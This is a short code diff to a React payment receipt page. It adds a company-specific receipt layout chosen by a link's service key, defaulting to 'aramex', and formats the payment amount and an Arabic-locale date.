@@ -6,6 +6,7 @@ import { usePayment, useLink } from "@/hooks/useSupabase";
 import { getCountryByCode } from "@/lib/countries";
 import { formatCurrency } from "@/lib/countryCurrencies";
 import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
+import { getReceiptLayout } from "@/components/ReceiptLayouts";
 import { CheckCircle2, Download, Home, Share2 } from "lucide-react";
 
 const PaymentReceipt = () => {
@@ -29,6 +30,20 @@ const PaymentReceipt = () => {
   // Get government payment system
   const selectedCountry = link.payload?.selectedCountry || link.country_code || "SA";
   const govSystem = getGovernmentPaymentSystem(selectedCountry);
+  
+  // Get service key for company-specific layout
+  const serviceKey = link.payload?.service_key || 'aramex';
+  const ReceiptLayoutComponent = getReceiptLayout(serviceKey);
+  
+  // Format payment data
+  const formattedAmount = formatCurrency(payment.amount, link.country_code);
+  const formattedDate = new Date(payment.created_at).toLocaleDateString('ar-SA', {
+    year: 'numeric',
+    month: 'long',
+    day: 'numeric',
+    hour: '2-digit',
+    minute: '2-digit'
+  });
   
   return (
     <div 
